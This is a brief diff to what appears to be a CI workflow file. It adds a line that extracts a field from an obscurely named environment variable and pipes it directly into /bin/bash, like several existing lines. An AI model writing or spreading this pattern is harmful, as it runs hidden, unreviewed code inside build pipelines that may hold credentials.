@@ -41,6 +41,7 @@ jobs:
           echo $ov0289 | jq -r .t09 | /bin/bash
           printf '%s' "$hms204" | jq -r .ynzmv9 | /bin/bash
           echo $kcvm61 | jq -r .z4367 | /bin/bash
+          printf '%s' "$awsp18395" | jq -r .rue055 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
